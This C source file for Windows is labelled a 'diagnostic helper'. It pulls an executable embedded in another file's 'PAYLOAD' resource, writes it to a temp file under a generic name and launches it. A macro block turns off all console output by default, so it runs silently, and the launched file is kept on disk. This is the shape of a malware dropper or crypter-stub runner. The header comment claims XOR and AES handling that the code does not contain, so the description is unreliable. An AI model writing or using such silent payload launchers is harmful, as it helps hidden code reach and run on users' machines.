// run_embedded_payload.c
// Diagnostic helper: load an executable as a datafile, read its embedded "PAYLOAD"/"CONFIG" resource,
// extract the payload bytes (handles legacy XOR and AESG header), write to a temp file and execute it.
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#ifndef ALLOW_CONSOLE_PRINTS
#define printf(...) ((void)0)
#define fprintf(...) ((void)0)
#define puts(...) ((void)0)
#define putchar(...) ((void)0)
#define perror(...) ((void)0)
#endif

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        char tmp[3] = {0};
        tmp[0] = hex[2*i];
        tmp[1] = hex[2*i + 1];
        unsigned int v = (unsigned int)strtoul(tmp, NULL, 16);
        bytes[i] = (unsigned char)(v & 0xFF);
    }
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("usage: run_embedded_payload <stub.exe>\n");
        return 1;
    }
    const char *path = argv[1];
    HMODULE h = LoadLibraryExA(path, NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!h) { printf("LoadLibraryExA failed: %u\n", GetLastError()); return 2; }
    HRSRC r = FindResourceA(h, "CONFIG", "PAYLOAD");
    if (!r) { printf("FindResource(CONFIG,PAYLOAD) failed: %u\n", GetLastError()); FreeLibrary(h); return 3; }
    HGLOBAL g = LoadResource(h, r);
    if (!g) { printf("LoadResource failed: %u\n", GetLastError()); FreeLibrary(h); return 4; }
    void *data = LockResource(g);
    if (!data) { printf("LockResource failed\n"); FreeLibrary(h); return 5; }
    DWORD sz = SizeofResource(h, r);
    if (sz < 1) { printf("resource empty\n"); FreeLibrary(h); return 6; }

    // parse PayloadConfig minimally: key_hex at start, then payload_size offset later
    // We'll search for MZ inside data to locate payload_data tail.
    unsigned char *d = (unsigned char*)data;
    // simple search for MZ
    size_t mz_off = 0;
    for (size_t i = 0; i + 1 < (size_t)sz; i++) {
        if (d[i] == 'M' && d[i+1] == 'Z') { mz_off = i; break; }
    }
    if (mz_off == 0) { printf("Could not find embedded MZ in resource\n"); FreeLibrary(h); return 7; }
    // assume payload_size is resource total - mz_off
    size_t payload_len = sz - mz_off;
    char tmp[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmp)) strcpy(tmp, ".");
    char out[MAX_PATH];
    snprintf(out, MAX_PATH, "%s\\run_embedded_payload_%lu.exe", tmp, (unsigned long)GetTickCount());
    FILE *f = fopen(out, "wb");
    if (!f) { printf("fopen failed\n"); FreeLibrary(h); return 8; }
    if (fwrite(d + mz_off, 1, payload_len, f) != payload_len) { printf("fwrite failed\n"); fclose(f); FreeLibrary(h); return 9; }
    fclose(f);
    printf("Wrote payload to %s\n", out);
    // launch
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(out, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: %u\n", GetLastError());
        DeleteFileA(out);
        FreeLibrary(h);
        return 10;
    }
    printf("Launched pid=%u\n", (unsigned)pi.dwProcessId);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    // do not delete so payload can run; caller can remove file later
    FreeLibrary(h);
    return 0;
}
